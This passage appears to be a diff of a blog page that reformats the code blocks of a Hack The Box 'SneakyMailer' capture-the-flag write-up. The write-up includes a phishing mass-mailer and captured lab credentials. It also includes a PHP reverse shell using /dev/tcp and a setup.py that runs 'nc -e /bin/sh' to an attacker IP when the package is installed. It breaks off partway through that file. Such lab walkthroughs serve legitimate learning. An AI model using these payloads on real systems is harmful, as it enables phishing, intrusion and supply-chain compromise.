@@ -94,7 +94,7 @@
 <h2 id="recon">Recon<a class="anchor" href="#recon">#</a></h2>
 <h3 id="nmap-scan">Nmap scan<a class="anchor" href="#nmap-scan">#</a></h3>
 <p>First scan for open ports.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">$ nmap -p- --min-rate=1000 -T4 10.10.10.197
+<pre><code>$ nmap -p- --min-rate=1000 -T4 10.10.10.197
 Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-05 10:43 EDT
 Stats: 0:00:06 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
 Connect Scan Timing: About 40.21% done; ETC: 10:44 (0:00:09 remaining)
@@ -111,9 +111,9 @@ PORT     STATE SERVICE
 8080/tcp open  http-proxy
 
 Nmap done: 1 IP address (1 host up) scanned in 13.74 seconds
-</code></pre></div><p>Web page redirects to <code>sneakycorp.htb</code> so we put it in <code>/etc/hosts</code>.</p>
+</code></pre><p>Web page redirects to <code>sneakycorp.htb</code> so we put it in <code>/etc/hosts</code>.</p>
 <p>I got some more info from the open ports with nmap.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">$ sudo nmap -p21,22,25,80,143,993,8080 -sC -sV -O -oA nmap/scan sneakycorp.htb
+<pre><code>$ sudo nmap -p21,22,25,80,143,993,8080 -sC -sV -O -oA nmap/scan sneakycorp.htb
 Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-05 10:44 EDT
 Nmap scan report for sneakycorp.htb (10.10.10.197)
 Host is up (0.060s latency).
@@ -156,14 +156,14 @@ Service Info: Host:  debian; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
 
 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 48.66 seconds
-</code></pre></div><h3 id="port-80-enumeration">Port 80 enumeration<a class="anchor" href="#port-80-enumeration">#</a></h3>
+</code></pre><h3 id="port-80-enumeration">Port 80 enumeration<a class="anchor" href="#port-80-enumeration">#</a></h3>
 <p>We can open the page and we can see 2 pages, <code>/index.php</code> and <code>/team.php</code>.</p>
 <h4 id="indexphp">index.php</h4>
 <p><img src="/htb/sneakymailer/1.png" alt=""></p>
 <h4 id="teamphp">team.php</h4>
 <p><img src="/htb/sneakymailer/2.png" alt=""></p>
 <p>For directory busting I used Gobuster.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">$ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u sneakycorp.htb -x php,txt -t 200
+<pre><code>$ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u sneakycorp.htb -x php,txt -t 200
 ===============================================================
 Gobuster v3.0.1
 by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)
@@ -188,8 +188,8 @@ by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)
 ===============================================================
 2020/10/05 10:20:53 Finished
 ===============================================================
-</code></pre></div><p>The only thing interesting here is <code>/pypi</code> and <code>/vendor</code>, I ran Gobuster on both paths but <code>/vendor</code> didn&rsquo;t have anything interesting. Below is a scan for <code>/pypi</code>.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">$ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u sneakycorp.htb/pypi/ -x php,txt -t 200
+</code></pre><p>The only thing interesting here is <code>/pypi</code> and <code>/vendor</code>, I ran Gobuster on both paths but <code>/vendor</code> didn&rsquo;t have anything interesting. Below is a scan for <code>/pypi</code>.</p>
+<pre><code>$ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u sneakycorp.htb/pypi/ -x php,txt -t 200
 ===============================================================
 Gobuster v3.0.1
 by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)
@@ -208,7 +208,7 @@ by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)
 ===============================================================
 2020/10/05 10:26:04 Finished
 ===============================================================
-</code></pre></div><h4 id="registerphp">register.php</h4>
+</code></pre><h4 id="registerphp">register.php</h4>
 <p><img src="/htb/sneakymailer/3.png" alt=""></p>
 <p>I checked all the traffic with Burp and figured this must be a dummy page because no matter what input I give the response is always the same.</p>
 <h4 id="ftp-anonymous-login">FTP anonymous login</h4>
@@ -218,7 +218,7 @@ by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)
 <p>So on <code>/team.php</code> we had a lot of mails. I used CyberChef to extract all emails.</p>
 <p><img src="/htb/sneakymailer/4.png" alt=""></p>
 <h4 id="emailtxt">email.txt</h4>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">tigernixon@sneakymailer.htb
+<pre><code>tigernixon@sneakymailer.htb
 garrettwinters@sneakymailer.htb
 ashtoncox@sneakymailer.htb
 cedrickelly@sneakymailer.htb
@@ -275,38 +275,38 @@ jonasalexander@sneakymailer.htb
 shaddecker@sneakymailer.htb
 sulcud@sneakymailer.htb
 donnasnider@sneakymailer.htb
-</code></pre></div><p>I created a simple Python script to send emails and started a Python SMTP server so I can be sure the output is correct.</p>
+</code></pre><p>I created a simple Python script to send emails and started a Python SMTP server so I can be sure the output is correct.</p>
 <h4 id="email_senderpy">email_sender.py</h4>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">#!/usr/bin/python3
+<pre><code>#!/usr/bin/python3
 
 import smtplib
-#SERVER = &#34;localhost&#34;
+#SERVER = &quot;localhost&quot;
 
-FROM = &#39;ajdin@psneakycorp.htb&#39;
+FROM = 'ajdin@psneakycorp.htb'
 
-TO = [&#34;someone@sneakycorp.htb&#34;] # must be a list
+TO = [&quot;someone@sneakycorp.htb&quot;] # must be a list
 
-SUBJECT = &#34;test subject&#34;
+SUBJECT = &quot;test subject&quot;
 
-TEXT = &#34;test message&#34;
+TEXT = &quot;test message&quot;
 
 # Prepare actual message
 
-message = &#34;&#34;&#34;\
+message = &quot;&quot;&quot;\
 From: %s
 To: %s
 Subject: %s
 
 %s
-&#34;&#34;&#34; % (FROM, &#34;, &#34;.join(TO), SUBJECT, TEXT)
+&quot;&quot;&quot; % (FROM, &quot;, &quot;.join(TO), SUBJECT, TEXT)
 
 # Send the mail
 
-server = smtplib.SMTP(&#39;localhost&#39;)
+server = smtplib.SMTP('localhost')
 server.sendmail(FROM, TO, message)
 server.quit()
-</code></pre></div><p>If we run email_sender.py we can get the email being sent in our local SMTP server.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">$ sudo python -m smtpd -c DebuggingServer -n localhost:25
+</code></pre><p>If we run email_sender.py we can get the email being sent in our local SMTP server.</p>
+<pre><code>$ sudo python -m smtpd -c DebuggingServer -n localhost:25
 [sudo] password for kali: 
 ---------- MESSAGE FOLLOWS ----------
 From: ajdin@psneakycorp.htb
@@ -316,35 +316,35 @@ X-Peer: 127.0.0.1
 
 test message
 ------------ END MESSAGE ------------
-</code></pre></div><p>So I modified the script to send an email from the CEO and email message contains a link which is on my local machine running a <code>nc</code>listener.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">#!/usr/bin/python3
+</code></pre><p>So I modified the script to send an email from the CEO and email message contains a link which is on my local machine running a <code>nc</code>listener.</p>
+<pre><code>#!/usr/bin/python3
 
 import smtplib
 
-FROM = &#39;angelicaramos@sneakymailer.htb&#39;
+FROM = 'angelicaramos@sneakymailer.htb'
 
-emails = open(&#39;email.txt&#39;, &#39;r&#39;)
+emails = open('email.txt', 'r')
 Lines = emails.readlines()
 for line in Lines:
     TO = []
     print(line.strip())
     TO.append(line.strip())
-    SUBJECT = &#34;Urgent, please help&#34;
-    TEXT = &#34;Hi, this is an emergency, could you please open this and resolve the issue? http://10.10.16.3:9999/help/&#34;
+    SUBJECT = &quot;Urgent, please help&quot;
+    TEXT = &quot;Hi, this is an emergency, could you please open this and resolve the issue? http://10.10.16.3:9999/help/&quot;
 
-    message = &#34;&#34;&#34;\
+    message = &quot;&quot;&quot;\
     From: %s
     To: %s
     Subject: %s
     
     %s
-    &#34;&#34;&#34; % (FROM, &#34;, &#34;.join(TO), SUBJECT, TEXT)
+    &quot;&quot;&quot; % (FROM, &quot;, &quot;.join(TO), SUBJECT, TEXT)
 
-    server = smtplib.SMTP(&#39;sneakycorp.htb&#39;)
+    server = smtplib.SMTP('sneakycorp.htb')
     server.sendmail(FROM, TO, message)
     server.quit()
-</code></pre></div><p>On our <code>nc</code> listener we get a request, someone opened the link provided.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">$ nc -lvnp 9999
+</code></pre><p>On our <code>nc</code> listener we get a request, someone opened the link provided.</p>
+<pre><code>$ nc -lvnp 9999
 listening on [any] 9999 ...
 connect to [10.10.16.3] from (UNKNOWN) [10.10.10.197] 47864
 POST /help/ HTTP/1.1
@@ -357,59 +357,59 @@ Content-Length: 185
 Content-Type: application/x-www-form-urlencoded
 
 firstName=Paul&amp;lastName=Byrd&amp;email=paulbyrd%40sneakymailer.htb&amp;password=%5E%28%23J%40SkFv2%5B%25KhIxKk%28Ju%60hqcHl%3C%3AHt&amp;rpassword=%5E%28%23J%40SkFv2%5B%25KhIxKk%28Ju%60hqcHl%3C%3AHt
-</code></pre></div><p>I decoded it:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">firstName: Paul
+</code></pre><p>I decoded it:</p>
+<pre><code>firstName: Paul
 lastName: Byrd
 email: paulbyrd%40sneakymailer.htb
 password: ^(#J@SkFv2[%KhIxKk(Ju`hqcHl&lt;:Ht
-</code></pre></div><h3 id="imap">IMAP<a class="anchor" href="#imap">#</a></h3>
+</code></pre><h3 id="imap">IMAP<a class="anchor" href="#imap">#</a></h3>
 <p>We got some creds but I still couldn&rsquo;t login into FTP. I tried to get into IMAP server on port 143, there might be some emails.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">$ nc sneakycorp.htb 143
+<pre><code>$ nc sneakycorp.htb 143
 * OK [CAPABILITY IMAP4rev1 UIDPLUS CHILDREN NAMESPACE THREAD=ORDEREDSUBJECT THREAD=REFERENCES SORT QUOTA IDLE ACL ACL2=UNION STARTTLS ENABLE UTF8=ACCEPT] Courier-IMAP ready. Copyright 1998-2018 Double Precision, Inc.  See COPYING for distribution information.
 01 LOGIN paulbyrd ^(#J@SkFv2[%KhIxKk(Ju`hqcHl&lt;:Ht
 * OK [ALERT] Filesystem notification initialization error -- contact your mail administrator (check for configuration errors with the FAM/Gamin library)
 01 OK LOGIN Ok.
-</code></pre></div><p>So we&rsquo;re in, let&rsquo;s try to see if anything is there.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">02 LIST &#34;&#34; &#34;*&#34;
-* LIST (\Unmarked \HasChildren) &#34;.&#34; &#34;INBOX&#34;
-* LIST (\HasNoChildren) &#34;.&#34; &#34;INBOX.Trash&#34;
-* LIST (\HasNoChildren) &#34;.&#34; &#34;INBOX.Sent&#34;
-* LIST (\HasNoChildren) &#34;.&#34; &#34;INBOX.Deleted Items&#34;
-* LIST (\HasNoChildren) &#34;.&#34; &#34;INBOX.Sent Items&#34;
-03 SELECT &#34;Inbox.Trash&#34;
+</code></pre><p>So we&rsquo;re in, let&rsquo;s try to see if anything is there.</p>
+<pre><code>02 LIST &quot;&quot; &quot;*&quot;
+* LIST (\Unmarked \HasChildren) &quot;.&quot; &quot;INBOX&quot;
+* LIST (\HasNoChildren) &quot;.&quot; &quot;INBOX.Trash&quot;
+* LIST (\HasNoChildren) &quot;.&quot; &quot;INBOX.Sent&quot;
+* LIST (\HasNoChildren) &quot;.&quot; &quot;INBOX.Deleted Items&quot;
+* LIST (\HasNoChildren) &quot;.&quot; &quot;INBOX.Sent Items&quot;
+03 SELECT &quot;Inbox.Trash&quot;
 * FLAGS (\Draft \Answered \Flagged \Deleted \Seen \Recent)
 * OK [PERMANENTFLAGS (\* \Draft \Answered \Flagged \Deleted \Seen)] Limited
 * 0 EXISTS
 * 0 RECENT
 * OK [UIDVALIDITY 590600304] Ok
-* OK [MYRIGHTS &#34;acdilrsw&#34;] ACL
+* OK [MYRIGHTS &quot;acdilrsw&quot;] ACL
 03 OK [READ-WRITE] Ok
-04 SELECT &#34;Inbox.Sent&#34;
+04 SELECT &quot;Inbox.Sent&quot;
 * FLAGS (\Draft \Answered \Flagged \Deleted \Seen \Recent)
 * OK [PERMANENTFLAGS (\* \Draft \Answered \Flagged \Deleted \Seen)] Limited
 * 0 EXISTS
 * 0 RECENT
 * OK [UIDVALIDITY 590600538] Ok
-* OK [MYRIGHTS &#34;acdilrsw&#34;] ACL
+* OK [MYRIGHTS &quot;acdilrsw&quot;] ACL
 04 OK [READ-WRITE] Ok
-05 SELECT &#34;Inbox.Deleted Items&#34;
+05 SELECT &quot;Inbox.Deleted Items&quot;
 * FLAGS (\Draft \Answered \Flagged \Deleted \Seen \Recent)
 * OK [PERMANENTFLAGS (\* \Draft \Answered \Flagged \Deleted \Seen)] Limited
 * 0 EXISTS
 * 0 RECENT
 * OK [UIDVALIDITY 589481592] Ok
-* OK [MYRIGHTS &#34;acdilrsw&#34;] ACL
+* OK [MYRIGHTS &quot;acdilrsw&quot;] ACL
 05 OK [READ-WRITE] Ok
-06 SELECT &#34;Inbox.Sent Items&#34;
+06 SELECT &quot;Inbox.Sent Items&quot;
 * FLAGS (\Draft \Answered \Flagged \Deleted \Seen \Recent)
 * OK [PERMANENTFLAGS (\* \Draft \Answered \Flagged \Deleted \Seen)] Limited
 * 2 EXISTS
 * 0 RECENT
 * OK [UIDVALIDITY 589480766] Ok
-* OK [MYRIGHTS &#34;acdilrsw&#34;] ACL
-</code></pre></div><p>We have 2 emails in &ldquo;Inbox/Sent Items&rdquo;, let&rsquo;s open them. (I removed some unneccesary text)</p>
+* OK [MYRIGHTS &quot;acdilrsw&quot;] ACL
+</code></pre><p>We have 2 emails in &ldquo;Inbox/Sent Items&rdquo;, let&rsquo;s open them. (I removed some unneccesary text)</p>
 <h4 id="email-1">Email 1</h4>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">02 FETCH 1 BODY[]
+<pre><code>02 FETCH 1 BODY[]
 * 1 FETCH (BODY[] {2167}
 MIME-Version: 1.0
 To: root &lt;root@debian&gt;
@@ -425,8 +425,8 @@ Original-Password: m^AsY7vTKVT+dV1{WOU%@NaHkUAId3]C
 
 Please notify me when you do it=20
 [...]
-</code></pre></div><h4 id="email-2">Email 2</h4>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">* 2 FETCH (BODY[] {585}
+</code></pre><h4 id="email-2">Email 2</h4>
+<pre><code>* 2 FETCH (BODY[] {585}
 To: low@debian
 From: Paul Byrd &lt;paulbyrd@sneakymailer.htb&gt;
 Subject: Module testing
@@ -441,12 +441,12 @@ Your current task is to install, test and then erase every python module you
 find in our PyPI service, let me know if you have any inconvenience.
 
 02 OK FETCH completed.
-</code></pre></div><h4 id="email-creds-from-first-email">Email creds from first email</h4>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">Username: developer
+</code></pre><h4 id="email-creds-from-first-email">Email creds from first email</h4>
+<pre><code>Username: developer
 Original-Password: m^AsY7vTKVT+dV1{WOU%@NaHkUAId3]C
-</code></pre></div><p>Now I was finally able to enter the FTP.</p>
+</code></pre><p>Now I was finally able to enter the FTP.</p>
 <h2 id="ftp-lfi-local-file-inclusion">FTP LFI (Local file inclusion)<a class="anchor" href="#ftp-lfi-local-file-inclusion">#</a></h2>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">kali@kali:~/htb/sneakymailer$ ftp sneakycorp.htb
+<pre><code>kali@kali:~/htb/sneakymailer$ ftp sneakycorp.htb
 Connected to sneakycorp.htb.
 220 (vsFTPd 3.0.3)
 Name (sneakycorp.htb:kali): developer
@@ -456,8 +456,8 @@ Password:
 Remote system type is UNIX.
 Using binary mode to transfer files.
 ftp&gt; 
-</code></pre></div><p>once I entered I saw a direcory called <code>dev</code> which contained site content. I looked around and found nothing in the site source code which could be of any help. I tried uploading a file and it worked, but I couldn&rsquo;t navigate to the file.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">ftp&gt; pu hello.txt
+</code></pre><p>once I entered I saw a direcory called <code>dev</code> which contained site content. I looked around and found nothing in the site source code which could be of any help. I tried uploading a file and it worked, but I couldn&rsquo;t navigate to the file.</p>
+<pre><code>ftp&gt; pu hello.txt
 local: hello.txt remote: hello.txt
 200 PORT command successful. Consider using PASV.
 150 Ok to send data.
@@ -476,7 +476,7 @@ drwxr-xr-x    4 0        0            4096 May 26 19:52 scss
 -rwxr-xr-x    1 0        0           26523 May 26 20:58 team.php
 drwxr-xr-x    8 0        0            4096 May 26 19:52 vendor
 226 Directory send OK.
-</code></pre></div><p>And I thought, maybe the <code>dev</code> direcory is hidden/deployed on another host. I ran ffuf to find another Virtual host.</p>
+</code></pre><p>And I thought, maybe the <code>dev</code> direcory is hidden/deployed on another host. I ran ffuf to find another Virtual host.</p>
 <p>I curled a random subdomain so I could see how the request looks like when I hit a subdomain that doesn&rsquo;t exist.</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">$ curl -H &#39;Host: randomsubdomain.sneakycorp.htb&#39; http://sneakycorp.htb
 &lt;<span style="color:#f92672">html</span>&gt;
@@ -487,15 +487,15 @@ drwxr-xr-x    8 0        0            4096 May 26 19:52 vendor
 &lt;/<span style="color:#f92672">body</span>&gt;
 &lt;/<span style="color:#f92672">html</span>&gt;
 </code></pre></div><p>I extracted the length from that response.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">$ curl -H &#39;Host: randomsubdomain.sneakycorp.htb&#39; http://sneakycorp.htb | wc -c
+<pre><code>$ curl -H 'Host: randomsubdomain.sneakycorp.htb' http://sneakycorp.htb | wc -c
   % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                  Dload  Upload   Total   Spent    Left  Speed
 100   185  100   185    0     0   1033      0 --:--:-- --:--:-- --:--:--  1039
 185
-</code></pre></div><p>So let&rsquo;s run now ffuf and try to get a response that doesn&rsquo;t match length of <code>185</code>.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">$ ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://sneakycorp.htb -H &#34;Host: FUZZ.sneakycorp.htb&#34; -fs 185 -t 100
+</code></pre><p>So let&rsquo;s run now ffuf and try to get a response that doesn&rsquo;t match length of <code>185</code>.</p>
+<pre><code>$ ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://sneakycorp.htb -H &quot;Host: FUZZ.sneakycorp.htb&quot; -fs 185 -t 100
 
-        /&#39;___\  /&#39;___\           /&#39;___\       
+        /'___\  /'___\           /'___\       
        /\ \__/ /\ \__/  __  __  /\ \__/       
        \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
         \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
@@ -520,41 +520,41 @@ dev                     [Status: 200, Size: 13737, Words: 4007, Lines: 341]
 Dev                     [Status: 200, Size: 13737, Words: 4007, Lines: 341]
 DEV                     [Status: 200, Size: 13737, Words: 4007, Lines: 341]
 :: Progress: [220560/220560] :: Job [1/1] :: 1736 req/sec :: Duration: [0:02:07] :: Errors: 0 ::
-</code></pre></div><h3 id="lfi-to-rce">LFI to RCE<a class="anchor" href="#lfi-to-rce">#</a></h3>
+</code></pre><h3 id="lfi-to-rce">LFI to RCE<a class="anchor" href="#lfi-to-rce">#</a></h3>
 <p>So, there is another subdomain. I tried to curl the site with</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">curl -H &#39;Host: dev.sneakycorp.htb&#39; http://sneakycorp.htb/
-</code></pre></div><p>and got the <code>index.php</code> file. I uploaded a simple file with following contents:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">&lt;?php echo &#39;&lt;p&gt;Hello World&lt;/p&gt;&#39;; ?&gt;
-</code></pre></div><p>and I got the following response:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">$ curl -H &#39;Host: dev.sneakycorp.htb&#39; http://sneakycorp.htb/hello.php
+<pre><code>curl -H 'Host: dev.sneakycorp.htb' http://sneakycorp.htb/
+</code></pre><p>and got the <code>index.php</code> file. I uploaded a simple file with following contents:</p>
+<pre><code>&lt;?php echo '&lt;p&gt;Hello World&lt;/p&gt;'; ?&gt;
+</code></pre><p>and I got the following response:</p>
+<pre><code>$ curl -H 'Host: dev.sneakycorp.htb' http://sneakycorp.htb/hello.php
 &lt;p&gt;Hello World&lt;/p&gt;
-</code></pre></div><p>So LFI to RCE, good let&rsquo;s try to get a reverse shell. I made a new file called <code>reverse.php</code> and started  <code>nc -lvnp 9999</code></p>
+</code></pre><p>So LFI to RCE, good let&rsquo;s try to get a reverse shell. I made a new file called <code>reverse.php</code> and started  <code>nc -lvnp 9999</code></p>
 <h4 id="reversephp">Reverse.php</h4>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">&lt;?php
-exec(&#34;/bin/bash -c &#39;bash -i &gt; /dev/tcp/10.10.16.3/9999 0&gt;&amp;1&#39;&#34;);
-</code></pre></div><p>after curling the file I got a shell as <code>www-data</code>.</p>
+<pre><code>&lt;?php
+exec(&quot;/bin/bash -c 'bash -i &gt; /dev/tcp/10.10.16.3/9999 0&gt;&amp;1'&quot;);
+</code></pre><p>after curling the file I got a shell as <code>www-data</code>.</p>
 <h2 id="privesc-to-user-low">PrivEsc to user low<a class="anchor" href="#privesc-to-user-low">#</a></h2>
 <p>I transfered <code>linenum.sh</code> and ran it. It found this hash on the machine:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">/var/www/pypi.sneakycorp.htb/.htpasswd
+<pre><code>/var/www/pypi.sneakycorp.htb/.htpasswd
 pypi:$apr1$RV5c5YVs$U9.OTqF5n8K4mxWpSSR/p/
-</code></pre></div><p>I simply cracked it with John.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">kali@kali:~/htb/sneakymailer$ sudo john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
-Warning: detected hash type &#34;md5crypt&#34;, but the string is also recognized as &#34;md5crypt-long&#34;
-Use the &#34;--format=md5crypt-long&#34; option to force loading these as that type instead
+</code></pre><p>I simply cracked it with John.</p>
+<pre><code>kali@kali:~/htb/sneakymailer$ sudo john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
+Warning: detected hash type &quot;md5crypt&quot;, but the string is also recognized as &quot;md5crypt-long&quot;
+Use the &quot;--format=md5crypt-long&quot; option to force loading these as that type instead
 Using default input encoding: UTF-8
 Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 256/256 AVX2 8x3])
 Will run 2 OpenMP threads
-Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status
+Press 'q' or Ctrl-C to abort, almost any other key for status
 soufianeelhaoui  (pypi)
 1g 0:00:00:31 DONE (2020-10-05 14:01) 0.03128g/s 111835p/s 111835c/s 111835C/s souheib2..souderton16
-Use the &#34;--show&#34; option to display all of the cracked passwords reliably
+Use the &quot;--show&quot; option to display all of the cracked passwords reliably
 Session completed
-</code></pre></div><p>The password is <code>soufianeelhaoui</code>, but I had no idea where to use it. I remembered the nmap scan and port <code>8080</code> which we didn&rsquo;t get any information from and that email:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">Hello low
+</code></pre><p>The password is <code>soufianeelhaoui</code>, but I had no idea where to use it. I remembered the nmap scan and port <code>8080</code> which we didn&rsquo;t get any information from and that email:</p>
+<pre><code>Hello low
 
 Your current task is to install, test and then erase every python module you 
 find in our PyPI service, let me know if you have any inconvenience.
-</code></pre></div><p>So I found a server on <code>8080</code>. This could be also done with ffuf.
+</code></pre><p>So I found a server on <code>8080</code>. This could be also done with ffuf.
 <img src="/htb/sneakymailer/5.png" alt=""></p>
 <h3 id="uploading-an-evil-package-to-pypiserver">Uploading an evil package to pypiserver<a class="anchor" href="#uploading-an-evil-package-to-pypiserver">#</a></h3>
 <h4 id="what-is-pypiserver">What is pypiserver?</h4>
@@ -569,7 +569,7 @@ I tried using twine but I was missing a package to send, so I went back read aga
 <p>setup.py is the build script for setuptools. It tells setuptools about your package (such as the name and version) as well as which code files to include.</p>
 </blockquote>
 <p>I made a direcory <code>pypi</code> with some example files I found online.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">$ tree
+<pre><code>$ tree
 .
 ├── dist
 │   └── example-pkg-YOUR-USERNAME-HERE-0.0.1.tar.gz
@@ -580,8 +580,8 @@ I tried using twine but I was missing a package to send, so I went back read aga
 │   └── top_level.txt
 ├── README.md
 └── setup.py
-</code></pre></div><p>I made <code>.pypirc</code> config file in my home direcory with following contents.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">[distutils]
+</code></pre><p>I made <code>.pypirc</code> config file in my home direcory with following contents.</p>
+<pre><code>[distutils]
 index-servers = 
   sneakycorp
 
@@ -589,56 +589,56 @@ index-servers =
 repository=http://pypi.sneakycorp.htb:8080/
 username=pypi
 password=soufianeelhaoui
-</code></pre></div><p>Now I could upload this with <code>python3 setup.py sdist upload -r sneakycorp</code>. So I made some changes inside setup.py to get a shell.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">#!/usr/bin/python3
+</code></pre><p>Now I could upload this with <code>python3 setup.py sdist upload -r sneakycorp</code>. So I made some changes inside setup.py to get a shell.</p>
+<pre><code>#!/usr/bin/python3
 import setuptools
 import os
 
-ip1 = os.system(&#39;nc -e /bin/sh 10.10.16.3 9998&#39;)
+ip1 = os.system('nc -e /bin/sh 10.10.16.3 9998')
 
-with open(&#34;README.md&#34;, &#34;r&#34;) as fh:
+with open(&quot;README.md&quot;, &quot;r&quot;) as fh:
     long_description = fh.read()
 
 setuptools.setup(
-    name=&#34;example-pkg-YOUR-USERNAME-HERE&#34;, # Replace with your own username
-    version=&#34;0.0.1&#34;,
-    author=&#34;Example Author&#34;,
-    author_email=&#34;author@example.com&#34;,
-    description=&#34;A small example package&#34;,
+    name=&quot;example-pkg-YOUR-USERNAME-HERE&quot;, # Replace with your own username
+    version=&quot;0.0.1&quot;,
+    author=&quot;Example Author&quot;,
+    author_email=&quot;author@example.com&quot;,
+    description=&quot;A small example package&quot;,
     long_description=long_description,
-    long_description_content_type=&#34;text/markdown&#34;,
-    url=&#34;https://github.com/pypa/sampleproject&#34;,
+    long_description_content_type=&quot;text/markdown&quot;,
+    url=&quot;https://github.com/pypa/sampleproject&quot;,
     packages=setuptools.find_packages(),
     classifiers=[
-        &#34;Programming Language :: Python :: 3&#34;,
-        &#34;License :: OSI Approved :: MIT License&#34;,
-        &#34;Operating System :: OS Independent&#34;,
+        &quot;Programming Language :: Python :: 3&quot;,
+        &quot;License :: OSI Approved :: MIT License&quot;,
